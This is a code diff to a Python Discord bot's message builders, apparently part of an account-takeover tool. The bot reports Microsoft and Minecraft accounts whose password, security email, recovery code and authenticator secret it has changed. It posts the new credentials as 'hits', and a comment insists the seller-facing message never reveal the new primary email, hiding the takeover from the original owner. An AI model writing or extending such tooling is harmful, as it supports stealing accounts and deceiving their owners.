@@ -84,22 +84,45 @@ def build_failure_embed(
     # Login email for copy line: prefer new primary when alias already changed
     login_email = primary_raw if primary_ok else original
 
-    embed = Embed(
-        title="Failed to secure account",
-        description=reason,
-        color=0xFA4343,
-    )
+    if credentials_changed:
+        desc = (
+            f"{reason}\n\n"
+            "Password / security email were already changed. "
+            "Use the credentials below to sign back in."
+        )
+        if primary_ok or ms.get("primary_alias_replaced") is True:
+            desc += (
+                "\n\n**Login with the new primary email below** — "
+                "the original Outlook alias was removed and will not work."
+            )
+        embed = Embed(
+            title="Account returned — save new credentials",
+            description=desc,
+            color=0xFA4343,
+        )
+    else:
+        embed = Embed(
+            title="Failed to secure account",
+            description=reason,
+            color=0xFA4343,
+        )
     embed.add_field(name="Error", value=f"```{detail[:1000]}```", inline=False)
-    embed.add_field(name="Original Email", value=f"```{original}```", inline=False)
-    if primary_ok:
-        embed.add_field(name="Primary Email", value=f"```{primary_raw}```", inline=False)
+    embed.add_field(name="Original Email", value=f"```{original}```", inline=True)
+    embed.add_field(
+        name="Login Email (primary)",
+        value=f"```{login_email}```",
+        inline=True,
+    )
     if credentials_changed:
         if ms.get("security_email") and ms["security_email"] != "Couldn't Change!":
-            embed.add_field(name="Security Email", value=f"```{ms['security_email']}```", inline=True)
+            embed.add_field(name="Security Email", value=f"```{ms['security_email']}```", inline=False)
         if ms.get("password") and ms["password"] != "Couldn't Change!":
             embed.add_field(name="Password", value=f"```{ms['password']}```", inline=True)
         if ms.get("recovery_code") and ms["recovery_code"] != "Couldn't Change!":
             embed.add_field(name="Recovery Code", value=f"```{ms['recovery_code']}```", inline=False)
+        auth = str(ms.get("auth_secret") or "").strip()
+        if auth and auth not in ("Disabled", "Couldn't Change!", "Failed", "None", "?"):
+            embed.add_field(name="Authenticator Secret", value=f"```{auth}```", inline=False)
         add_credential_line_field(
             embed,
             email=login_email,
@@ -238,19 +261,40 @@ async def build_account_embeds(account: dict, elapsed: float = 0, account_id: st
     hit_embed.add_field(name="MC Username", value=f"```{mc.get('name', 'No Minecraft')}```", inline=False)
     hit_embed.add_field(name="MC Method", value=f"```{mc.get('method', 'Unknown')}```", inline=True)
     hit_embed.add_field(name="MC Capes", value=f"```{mc.get('capes', 'No capes')}```", inline=True)
-    hit_embed.add_field(name="Primary Email", value=f"```{ms['email']}```", inline=False)
-    hit_embed.add_field(name="Security Email", value=f"```{ms['security_email']}```", inline=True)
+    old_email = _clean(
+        ms.get("original_email") or ms.get("seller_email") or "",
+        fallback="",
+    )
+    new_email = _clean(ms.get("email"), fallback="N/A")
+    if old_email and old_email.lower() != new_email.lower():
+        hit_embed.add_field(name="Old Email", value=f"```{old_email}```", inline=True)
+        hit_embed.add_field(name="New Email (primary)", value=f"```{new_email}```", inline=True)
+    else:
+        # Alias replace failed or never ran — primary is still the submitted address
+        hit_embed.add_field(name="Old Email", value=f"```{old_email or new_email}```", inline=True)
+        hit_embed.add_field(
+            name="New Email (primary)",
+            value=f"```{new_email}```\n_Alias not replaced — same as old_",
+            inline=True,
+        )
+    hit_embed.add_field(name="Security Email", value=f"```{ms['security_email']}```", inline=False)
     hit_embed.add_field(name="Password", value=f"```{ms['password']}```", inline=False)
     hit_embed.add_field(name="Secret Key", value=f"```{ms['auth_secret']}```", inline=False)
     hit_embed.add_field(name="Recovery Code", value=f"```{ms['recovery_code']}```", inline=False)
     add_credential_line_field(
         hit_embed,
-        email=ms.get("email", ""),
+        email=new_email,
         recovery=ms.get("recovery_code", ""),
         password=ms.get("password", ""),
         security_email=ms.get("security_email", ""),
         username=mc.get("name") or mc.get("gamertag") or "",
     )
+    if old_email and old_email.lower() != new_email.lower():
+        hit_embed.add_field(
+            name="Copy (old → new)",
+            value=f"```{old_email} → {new_email}```",
+            inline=False,
+        )
     hit_embed.set_footer(text=f"{time.strftime('%d/%m/%y', time.localtime())}, {time.strftime('%H:%M', time.localtime())}")
 
     # Seller-facing embed: NEVER expose the post-secure primary (sunny@…).
@@ -312,7 +356,8 @@ async def build_account_embeds(account: dict, elapsed: float = 0, account_id: st
                 f"**Username:** {mc.get('name', 'No Minecraft')}\n"
                 f"**Has MC:** {bool(mc.get('SSID'))}\n"
                 f"**Capes:** {mc.get('capes', 'No capes')}\n"
-                f"**Email:** {ms['email']}\n"
+                f"**Old Email:** {ms.get('original_email') or ms.get('email')}\n"
+                f"**New Email (primary):** {ms['email']}\n"
                 f"**Security Email:** {ms['security_email']}\n"
                 f"**Password:** {ms['password']}\n"
                 f"**Recovery Code:** {ms['recovery_code']}"
